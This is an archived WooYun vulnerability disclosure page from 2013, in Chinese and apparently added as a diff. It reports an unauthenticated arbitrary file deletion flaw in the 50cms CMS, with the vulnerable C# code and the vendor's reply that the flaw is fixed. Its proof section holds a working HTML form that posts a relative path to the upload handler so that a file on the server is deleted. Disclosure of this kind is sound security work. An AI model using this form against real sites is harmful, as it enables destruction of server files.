@@ -1,0 +1,229 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		50cms任意文件删除  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		50cms任意文件删除  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/wefgod">wefgod</a> 
+</li><li>提交时间：		2013-03-03 15:17</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-03-03：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-03-03：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-03-06：	细节向第三方安全合作伙伴开放<br/>
+									2013-03-13：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-03-23：	细节向普通白帽子公开<br/>
+									2013-04-12：	细节向实习白帽子公开<br/>
+									2013-04-17：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">50cms存在任意文件删除的问题</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">这套开源的CMS有两个页面存在这个问题。<br />
+<br />
+看看代码就知道了，<br />
+<br />
+文件1，SingleUpload.ashx<br />
+<br />
+</p><pre><code>//检查是否登录后上传操作<br />
+            //if (!new ManagePage().IsAdminLogin())<br />
+            //{<br />
+            //    context.Response.Write(&quot;{msg: 0, msbox: \&quot;请登录后再进行上传文件！\&quot;}&quot;);<br />
+            //    return;<br />
+            //}</code></pre><p class='detail'><br />
+<br />
+验证是否登录的代码都被注释掉了，然后下面是一些相关的获取删除文件名的信息的操作：<br />
+<br />
+</p><pre><code>string _refilepath = context.Request.QueryString[&quot;ReFilePath&quot;]; //取得返回的对象名称<br />
+            string _delfile = context.Request.Params[_refilepath];<br />
+<br />
+            UpLoad upFiles = new UpLoad();<br />
+            string msg = upFiles.fileSaveAs(_upfile, _iswater);<br />
+            //删除已存在的旧文件<br />
+            if (!string.IsNullOrEmpty(_delfile))<br />
+            {<br />
+                string _filename = Utils.GetMapPath(_delfile);<br />
+                if (File.Exists(_filename))<br />
+                {<br />
+                    File.Delete(_filename);<br />
+                }<br />
+            }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+基本上只要权限够，想删除什么都可以。中间还有一段代码要注意，就是上传文件不可以为空：<br />
+<br />
+           if (_upfile == null) <br />
+<br />
+            {<br />
+<br />
+                context.Response.Write(&quot;{\&quot;msg\&quot;: 1, \&quot;msbox\&quot;: \&quot;请选择要上传文件！\&quot;}&quot;);<br />
+<br />
+                return;<br />
+<br />
+            }<br />
+<br />
+<br />
+<br />
+根据这些构造一下就可以搞定了。<br />
+<br />
+<br />
+<br />
+文件2，DeleteAlbumFile.ashx，问题和上面基本类似 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">&lt;form action=&quot;http://test.50cms.com/tools/SingleUpload.ashx?UpFilePath=FileUpload&amp;ReFilePath=123&quot; method=&quot;post&quot; enctype=&quot;MULTIPART/FORM-DATA&quot;&gt;<br />
+<br />
+              选择文件：&lt;input type=&quot;file&quot; id=&quot;file&quot; name=&quot;FileUpload&quot;/&gt;&lt;br&gt;<br />
+<br />
+              选择路径：&lt;input type=&quot;input&quot; name=&quot;123&quot; value=&quot;../KindEditor/asp.net/demo.aspx&quot; /&gt;&lt;br&gt;<br />
+<br />
+              &lt;input type=&quot;submit&quot; /&gt;&lt;br&gt;<br />
+<br />
+&lt;/form&gt;<br />
+<br />
+对比下面两个图：<br />
+<br />
+</p><p class="detail"><a href="../images/05084643b6dbec8f3b4c932adb54f2ed3136c780.jpg" target="_blank"><img src="../images/05084643b6dbec8f3b4c932adb54f2ed3136c780.jpg" alt=".jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/05084659b03c1126d15d82b38ec400ee5685c7db.jpg" target="_blank"><img src="../images/05084659b03c1126d15d82b38ec400ee5685c7db.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">别乱让人删除文件啊……而且登录也要限制一下。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/wefgod" title="wefgod">wefgod</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-018388" title="50cms任意文件删除">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：7 </p>
+													<p class="detail">确认时间：2013-03-03 15:57</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢对50cms 的关注，本系统是个开源免费的东东，因此发展离不开大家的关心和关爱，最新版本已经修补上该漏洞，可在官网瞎子，演示网站由于服务器放香港，故没更新最新程序，是我们是疏忽。再次感谢对本程序的支持。我们将一如既往做好我们的产品免费提供给大家，也欢迎更多的人来交流。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="18388";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
